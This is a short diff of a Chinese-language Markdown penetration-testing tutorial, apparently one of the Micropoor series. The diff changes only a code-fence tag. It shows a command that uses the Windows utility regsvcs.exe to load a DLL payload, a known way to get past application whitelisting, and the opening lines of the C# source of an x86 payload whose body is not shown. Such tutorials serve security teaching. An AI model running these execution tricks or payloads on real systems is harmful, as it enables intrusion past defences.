@@ -34,7 +34,7 @@ C:\Windows\Microsoft.NET\Framework\v4.0.30319\regsvcs.exe Micropoor.dll
 ### 附录：Micropoor.cs
 **注：x86 payload**
 
-```c#
+```csharp
 using System; using System.Net; using System.Linq; using System.Net.Sockets; using System.Runtime.InteropServices; using System.Threading; using System.EnterpriseServices; using System.Windows.Forms;
 
 namespace phwUqeuTRSqn
